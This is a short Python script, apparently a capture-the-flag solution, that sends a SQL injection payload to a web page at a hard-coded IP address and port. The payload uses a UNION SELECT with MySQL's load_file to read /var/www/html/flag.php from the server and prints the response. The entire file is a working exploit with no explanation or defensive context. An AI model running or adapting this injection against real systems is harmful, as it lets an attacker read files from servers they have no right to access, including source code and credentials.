import requests
url = 'http://111.200.241.244:52109/'
payload = "view.php?no=0 union all select 1,load_file('/var/www/html/flag.php'),3,4#"

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
    }

data = {
    
}

html = requests.get(url + payload, headers=headers, data=data)
html.encoding = "utf-8"
print(html.text)